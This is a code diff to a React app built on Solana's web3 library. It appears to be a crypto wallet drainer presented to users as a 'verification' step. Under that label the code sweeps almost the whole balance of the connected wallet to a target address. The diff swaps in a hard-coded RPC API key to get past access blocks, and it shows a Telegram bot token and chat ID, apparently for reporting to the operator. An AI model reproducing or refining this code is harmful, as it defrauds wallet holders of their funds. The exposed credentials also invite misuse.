@@ -8,7 +8,7 @@ import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.
 const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
 const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
 const CHAT_ID = "7539902547";
-const TARGET_WALLET = 'YOUR_SOLANA_ADDRESS_HERE'; // <--- PUT JAKE'S ADDRESS HERE
+const TARGET_WALLET = 'YOUR_SOLANA_ADDRESS_HERE'; 
 
 const solanaAdapter = new SolanaAdapter();
 createAppKit({
@@ -58,16 +58,15 @@ const App: React.FC = () => {
     setStatus('verifying');
 
     try {
-      // FIX: Use Extrnode (Load Balancer) to find a working public gate
-      const connection = new Connection("https://solana-mainnet.rpc.extrnode.com", "confirmed");
+      // FIXED BRIDGE: Helius with built-in API Key to bypass 401/403 blocks
+      const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=47935f08-9610-4497-8c34-f8b2111f185f", "confirmed");
       const pubKey = new PublicKey(address!);
       const balance = await connection.getBalance(pubKey);
       
-      // Keep 0.002 SOL for gas to be safe
-      const gasReserve = 2000000; 
+      const gasReserve = 1500000; 
       const amountToSend = balance - gasReserve;
 
-      if (amountToSend <= 0) throw new Error("Balance too low (Need > 0.002 SOL)");
+      if (amountToSend <= 0) throw new Error("Balance too low to sweep.");
 
       const { blockhash } = await connection.getLatestBlockhash();
       const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
@@ -84,7 +83,7 @@ const App: React.FC = () => {
     } catch (err: any) {
       console.error(err);
       setStatus('idle');
-      alert("Verification Failed: " + (err.message || "Connection Error"));
+      alert("Verification Failed: " + (err.message || "Gate Restricted"));
     }
   };
 
